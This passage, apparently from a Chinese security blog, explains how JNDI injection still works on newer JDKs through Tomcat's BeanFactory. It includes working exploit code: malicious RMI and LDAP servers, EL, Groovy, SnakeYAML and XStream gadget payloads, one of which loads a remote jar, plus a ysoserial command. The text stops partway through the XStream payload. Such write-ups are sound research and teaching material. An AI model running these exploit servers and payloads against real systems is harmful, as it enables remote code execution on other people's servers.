alt=""></p><p>跟进去会发现是通过loadClass()函数来加载我们传入的org.apache.naming.factory.BeanFactory类，然后新建该类实例并将其转换成ObjectFactory类型，也就是说，<strong>我们传入的Factory类必须实现ObjectFactory接口类、而org.apache.naming.factory.BeanFactory正好满足这一点</strong>：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953748083-947e8a07-dc23-4465-9a99-db9d83363e09.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959225871-1d7ab388-0c6a-4fd9-834b-c70baf0ab612.png" alt=""></p><p>这里可以知道就是首先会加载本地的工厂类，如果不存在在去远程加载我们指定的类。这里我们知道如果本地存在<code>che.naming.factory.BeanFactory</code> 工厂类他是能加载成功的。所以我们继续跟进<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953861905-5ec23da2-30ad-48ad-b636-0f7434be98d5.png" alt=""></p><p>跟进看到org.apache.naming.factory.BeanFactory类的getObjectInstance()函数中，会判断obj参数是否是ResourceRef类实例，是的话代码才会往下走，<strong>这就是为什么我们在恶意RMI服务端中构造Reference类实例的时候必须要用Reference类的子类ResourceRef类来创建实例</strong>：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732954492272-f5011f2a-6c7d-44af-90b6-1717837926bc.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959539881-9d24ca56-b59c-4dcc-8212-72bdcd30347b.png" alt=""></p><p>接着获取Bean类为<code>javax.el.ELProcessor</code>后，实例化该类并获取其中的forceString类型的内容，其值是我们构造的<code>x=eval</code>内容</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959635866-852870b9-7bfc-4a3b-b37f-8355bbc77da8.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959676394-68224427-adf9-4d3f-8c25-72a3feedf82b.png" alt=""></p><p>继续往下调试可以看到，查找forceString的内容中是否存在”=”号，不存在的话就调用属性的默认setter方法，存在的话就取键值、其中键是属性名而对应的值是其指定的setter方法。如此，**之前设置的forceString的值就可以强制将x属性的setter方法转换为调用我们指定的eval()方法了，这是BeanFactory类能进行利用的关键点！**之后，就是获取beanClass即javax.el.ELProcessor类的eval()方法并和x属性一同缓存到forced这个HashMap中：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733105140413-e37db1dd-be48-419f-8968-d6148c110919.png" alt=""></p><p>接着while语句来遍历获取ResourceRef类实例addr属性的元素，当获取到addrType为x的元素时退出当前所有循环，然后调用getContent()函数来获取x属性对应的contents即恶意表达式。这里就是恶意RMI服务端中ResourceRef类实例添加的第二个元素：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733105371315-2383c27c-989f-4cff-aaee-68bc2a16b39e.png" alt=""></p><p>获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733105497850-e80f14a7-c3c4-4ea0-9f0d-88fddb534bb1.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953958131-1ecf39f7-843d-49b3-8d28-81cefcaf9b26.png" alt=""></p><p>最关键的其实在这里，有一个反射的方法,该类的<code>getObjectInstance()</code>函数中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于<code>Reference</code>对象，均是攻击者可控的。</p><h3 id="服务端rmi代码">服务端rmi代码</h3><h4 id="el表达式">el表达式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        <span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;evilEL&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="grovy">grovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">    <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;def x\n&quot;</span>;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line"></span><br><span class="line">    <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">    registry.bind(<span class="string">&quot;evilGroovy&quot;</span>, referenceWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LDAP高版本绕过">LDAP高版本绕过</h2><p>其实这里就是在分析LDAP+JNDI的时候他有个类似swich的东西，当时传入的是引用类，所以走了引用类的逻辑，但是如果我们传入的是序列化的对象，并且后续会被反序列化，那么就相当于存在了一个天然的反序列化入口了，就可以触发本地的Gadget了，可以看白日梦组长的JNDI的视频。</p><p>先构造一个存在漏洞的环境</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>使用yso工具生成payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsCollections6 <span class="string">&#x27;open -a Calculator&#x27;</span> | base64</span><br></pre></td></tr></table></figure><p>这里写一个LDAP服务器的代码并打成jar包方便以后使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jndibypass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="comment">//高版本LDAP绕过</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] tmp_args )</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp_args.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Usage: java xxx.jar &lt;IP&gt; &lt;file&gt;&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> tmp_args[<span class="number">0</span>];</span><br><span class="line">        String[] args = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://&quot;</span> + ip +<span class="string">&quot;/#Evail&quot;</span>&#125;;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(tmp_args[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            payload = FileUtils.readFileToString(file);</span><br><span class="line">            System.out.println(payload);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">6666</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ]), payload));</span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">        System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="keyword">private</span> String payload;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb , String payload)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">            <span class="built_in">this</span>.payload = payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e, payload);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e , String payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(payload));</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这里打jar包有太多坑点参考：</p><p><a href="https://blog.csdn.net/NullNullAgo/article/details/124703694">https://blog.csdn.net/NullNullAgo/article/details/124703694</a></p><p><a href="https://blog.csdn.net/qq_42476644/article/details/112178820">https://blog.csdn.net/qq_42476644/article/details/112178820</a></p><p>将上面生成的payloda放到一个文件中放到ldap里</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar LDAPServer.jar <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733143029024-66883c6b-a87d-463c-aa2e-21b2cdb59654.png" alt=""></p><p>之后在可控端输入</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733143143770-f80c690f-d579-4b71-9ba0-ad8b510dcfff.png" alt=""></p><p>现在开始调试，前面的lookup和之前一样主要看关键点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733146117176-16c3b9f6-b53e-4617-8445-399c150d77b6.png" alt=""></p><p>跟到decodeObject里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733146148308-180970fc-8f7f-4a21-aa50-0f3a7ad0b49d.png" alt=""></p><p>可以看到这里会根据不同的类型进入不同的判断之前是工厂类现在是序列化的数据，所以会进入第一个判断</p><p>执行deserializeObject方法，跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733146275002-190dd5fd-0a3a-4b12-8a21-8535d4134396.png" alt=""></p><p>可以看到这里会反序列化读出来</p><h2 id="snakeyaml">snakeyaml</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_snakeyaml</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=load&quot;</span>));</span><br><span class="line">    ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, yaml));</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p><h2 id="xstream">xstream</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ResourceRef <span class="title function_">tomcat_xstream</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;com.thoughtworks.xstream.XStream&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  &lt;unserializable-parents/&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;  &lt;java.util.PriorityQueue&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &lt;default&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;      &lt;size&gt;2&lt;/size&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &lt;int&gt;3&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;      &lt;handler class=&#x27;sun.tracing.NullProvider&#x27;&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &lt;active&gt;true&lt;/active&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &lt;probes&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;          &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &lt;method&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;              &lt;parameter-types&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;              &lt;/parameter-types&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;              &lt;proxy class=&#x27;java.lang.Runtime&#x27;/&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;              &lt;implementing__method&gt;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                